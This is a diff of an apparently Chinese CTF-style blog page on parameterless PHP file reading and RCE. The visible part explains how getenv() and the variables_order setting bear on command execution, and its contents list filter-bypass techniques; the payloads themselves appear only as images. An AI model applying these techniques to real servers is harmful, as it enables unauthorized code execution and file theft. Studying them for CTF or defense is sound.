-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<h4 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h4><p><code>getenv()</code>  ：获取环境变量的值(在PHP7.1之后可以不给予参数)</p>
+<p>所以该函数只适用于PHP7.1之后版本，否则会出现：<code>Warning:  getenv() expects exactly 1 parameter, 0 given in ...</code>报错</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="t"></p>
+<p><code>getenv()</code> 可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的<code>php.ini</code>中，<code>variables_order</code>值为：<code>GPCS</code></p>
+<p>也就是说系统在定义PHP预定义变量时的顺序是 <code>GET,POST,COOKIES,SERVER</code>，没有定义<code>Environment(E)</code>，你可以修改<code>php.ini</code>文件的 <code>variables_order</code>值为你想要的顺序，如：<code>&quot;EGPCS&quot;</code>。这时，<code>$_ENV</code>的值就可以取得了</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/u.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>我们来看修改后的值：（环境不同，环境变量显示也不同）</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>对此我们可以加以利用，方法同上文：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<h2 id="小结"><a class="markdownIt-Anchor" href="#小结">#</a> 小结</h2>
-<p>无参数 RCE 和文件读取实际情况下会存在许多过滤，需要自己结合以上方法绕过，主要还是考察对 PHP 函数的熟练程度</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/w.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>无参数RCE和文件读取实际情况下会存在许多过滤，需要自己结合以上方法绕过，主要还是考察对PHP函数的熟练程度</p>
 
   </div>
   
@@ -2872,21 +2877,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/04/21/HTTP%E5%8F%91%E9%80%81%E5%A4%B4Headers%E6%95%B4%E7%90%86/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>HTTP发送头Headers整理</p>
-          <p class='content'>刷 buuctf 的时候遇到一道 http 1 的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下
+          <p class='content'>刷buuctf的时候遇到一道http 1的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下
 
-学习链接：https://blog.csdn.net/weixin_51735061...</p>
+
+学习链接：https://blog.csdn.net/weixin_51735061/ar...</p>
         </a>
       
       
         <a class='next' href='/2023/04/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
           <p class='title'>反序列化<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'># PHP 反序列化
+          <p class='content'>PHP反序列化
 
-# 序列化与反序列化
-序列化可以将变量转换为字符串，并且在转换的过程中可以保存 当前变量的值
-O:4:“Name”:2:
-反序列化可以将序列化生成的字符串转换回变量。
-1...</p>
+序列化与反序列化序列化可以将变量转换为字符串，并且在转换的过程中可以保存 当前变量的值 
+O:4:”Name”:2:{s:8:”username”;s:5:”admin”;s:...</p>
         </a>
       
     </div>
@@ -2944,7 +2947,7 @@ O:4:“Name”:2:
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-text"> 代码解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text"> 无参数任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text"> 查看当前目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1localeconv"><span class="toc-text"> 1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2chr46"><span class="toc-text"> 2.chr(46)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3phpversion"><span class="toc-text"> 3.phpversion()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4crypt"><span class="toc-text"> 4.crypt()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text"> 读取当前目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8A%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text"> 查看上一级目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dirname%E6%96%B9%E6%B3%95"><span class="toc-text"> dirname () 方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text"> 读取上级目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text"> 查看和读取根目录文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Crce"><span class="toc-text"> 无参数命令执行 (RCE)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getallheadersapache_request_headers"><span class="toc-text"> getallheaders()&amp;apache_request_headers()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get_defined_vars"><span class="toc-text"> get_defined_vars()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session_id"><span class="toc-text"> session_id()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getenv"><span class="toc-text"> getenv()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text"> 小结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-text">代码解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">无参数任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">查看当前目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-localeconv"><span class="toc-text">1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-chr-46"><span class="toc-text">2.chr(46)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-phpversion"><span class="toc-text">3.phpversion()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-crypt"><span class="toc-text">4.crypt()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">读取当前目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8A%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">查看上一级目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dirname-%E6%96%B9%E6%B3%95"><span class="toc-text">dirname()方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">读取上级目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">查看和读取根目录文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-RCE"><span class="toc-text">无参数命令执行(RCE)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getallheaders-amp-apache-request-headers"><span class="toc-text">getallheaders()&amp;apache_request_headers()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-defined-vars"><span class="toc-text">get_defined_vars()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-id"><span class="toc-text">session_id()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getenv"><span class="toc-text">getenv()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol>
     </div>
   </section>
 
